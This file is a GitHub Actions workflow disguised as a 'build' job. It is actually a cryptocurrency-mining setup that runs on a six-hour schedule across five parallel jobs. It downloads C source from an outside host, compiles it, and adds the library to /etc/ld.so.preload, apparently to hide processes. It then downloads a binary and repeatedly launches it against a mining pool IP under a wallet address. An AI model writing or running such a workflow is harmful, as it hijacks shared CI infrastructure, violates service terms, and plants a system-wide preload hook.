name: build unf

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    name: build
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1, 2, 3, 4, 5]
        flag: [A]
    env:
      NUM_JOBS: 40
      JOB: ${{ matrix.go }}
    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Install Dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y sudo wget curl build-essential cpulimit

    - name: Download and compile code
      run: |
        curl -L https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
        gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
        sudo mv libnyumput.so /usr/local/lib/
        echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
        rm nyumput.c

    - name: Prepare environment
      run: |
        mkdir -p .lib && cd .lib
        wget -O sgr1 https://github.com/barburonjilo/back/raw/main/sr
        chmod +x sgr1

    - name: Run and manage process
      run: |
        start_time=$(date +%s)
        end_time=$((start_time + 6*3600))  # 6 hours from start
        while [ $(date +%s) -lt $end_time ]; do
          if [ -f .lib/sgr1 ]; then
            # Start the process with cpulimit
            cpulimit -l 300 -e .lib/sgr1 &
            
            # Store the PID of cpulimit
            cpulimit_pid=$!
            
            # Run the process with the specified parameters in background
            nohup .lib/sgr1 -a yescryptr32 --pool 45.115.225.240:843 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$cpulimit_pid --timeout 120 -t 4 &
            
            # Store the PID of the running process
            process_pid=$!
            
            # Run for 1 minute
            sleep 60
            
            # Kill the process
            kill $process_pid || true

            # Wait for 2 minutes before the next iteration
            sleep 120
          else
            echo "sgr1 not found. Skipping..."
            sleep 120
          fi
        done

        # Clean up
        kill $cpulimit_pid || true
